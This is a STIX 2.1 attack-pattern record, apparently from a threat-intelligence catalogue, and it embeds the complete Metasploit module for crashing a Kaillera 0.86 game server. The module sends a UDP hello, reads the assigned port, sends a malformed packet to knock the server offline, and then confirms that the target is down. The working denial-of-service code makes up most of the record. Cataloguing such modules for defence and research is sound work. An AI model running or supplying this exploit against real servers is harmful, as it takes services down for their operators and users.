{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--97470353-9ca3-4071-97ae-f32fc8e3eb3d",
    "created": "2024-08-14T16:25:10.417834Z",
    "modified": "2024-08-14T16:25:10.417839Z",
    "name": "Kaillera 0.86 Server Denial of Service ",
    "description": " The Kaillera 0.86 server can be shut down by sending any malformed packet after the initial \"hello\" packet. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/games/kaillera.rb",
            "external_id": "kaillera.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Kaillera 0.86 Server Denial of Service' ,\n      'Description'    => %q{\n          The Kaillera 0.86 server can be shut down by sending any malformed packet\n        after the initial \"hello\" packet.\n      },\n      'Author'         => [\"Sil3nt_Dre4m\"],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2011-07-02'))\n\n    register_options([\n      Opt::RPORT(27888)\n    ])\n  end\n\n  def run\n    # Send HELLO to target\n    connect_udp\n    print_status(\"Sending Crash request...\")\n    udp_sock.put(\"HELLO0.83\\0\")\n    res = udp_sock.recvfrom(15)\n    disconnect_udp\n\n    if res[0] =~ /HELLOD00D([0-9]{1,5})/\n      port = $1\n    else print_error(\"Connection failed\")\n      return\n    end\n\n    # Send DOS packet\n    connect_udp(global = true,'RPORT' => port)\n    print_status(\"Sending DoS packet to #{rhost}:#{port}...\")\n    udp_sock.put(\"Kthxbai\")\n    disconnect_udp\n\n    # Check is target is down\n    connect_udp\n    print_status(\"Checking target...\")\n    udp_sock.put(\"HELLO0.83\\0\")\n    res = udp_sock.recvfrom(15)\n    disconnect_udp\n\n    if res[0] =~ /HELLO/\n      print_error(\"DoS attempt failed.  It appears target is still up.\")\n    else\n      print_good(\"Target is down\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-07-02"
}